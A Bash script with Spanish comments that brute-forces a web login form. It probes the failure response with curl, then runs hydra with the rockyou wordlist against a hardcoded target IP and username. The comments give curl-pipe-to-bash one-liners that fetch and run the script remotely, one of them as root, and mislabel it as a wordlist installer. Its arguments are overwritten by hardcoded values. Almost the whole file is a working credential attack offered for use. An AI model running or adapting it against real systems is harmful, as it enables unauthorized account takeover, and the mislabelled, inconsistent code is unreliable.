#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para instalar la máxima cantidad posible de WordLists en texto plano en Debian
#
# Ejecución remota con parámetros (puede requerir permisos sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | bash -s '10.10.179.150' '/login' 'username' 'password' 'molly' '/home/user/Downloads/rockyou.txt''
#
# Ejecución remota como root (para sistemas sin sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | sed 's-sudo--g' | bash
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | nano -
# ----------

vIP="$1"
vSubURL="$2"
vUserField="$3"
vPassField="$4"
vUsuario="$5"
vUbicDicc="$6"


vIP='10.10.179.150'
vSubURL='/login'
vUserField='username'
vPassField='password'
vUsuario='molly'
vUbicDicc='/home/nipegun/Descargas/rockyou.txt'

# Determinar el código de error
  vErrorCode=$(curl -i -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL" | grep HTTP | grep Found | cut -d' ' -f2)
  echo ""
  echo ""
  echo ""

# Determinar el texto de error
  vErrorText=$(curl -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL" | cut -d' ' -f2)

# Mostrar mensajes con error
  echo ""
  echo "  El código que devuelve la web al introducir credenciales incorrectas es:"
  echo ""
  echo "    $vErrorCode"
  echo ""
  echo "  El texto que devuelve la web al introducir credenciales incorrectas es:"
  echo ""
  echo "    $vErrorText"
  echo ""

# Atacar
  echo ""
  echo "  Probando ataque de fuerza bruta..."
  echo ""
  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:$vUserField=^USER^&$vPassField=^PASS^:S=$vErrorCode" -V
  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:$vUserField=^USER^&$vPassField=^PASS^:F=$vErrorText" -V
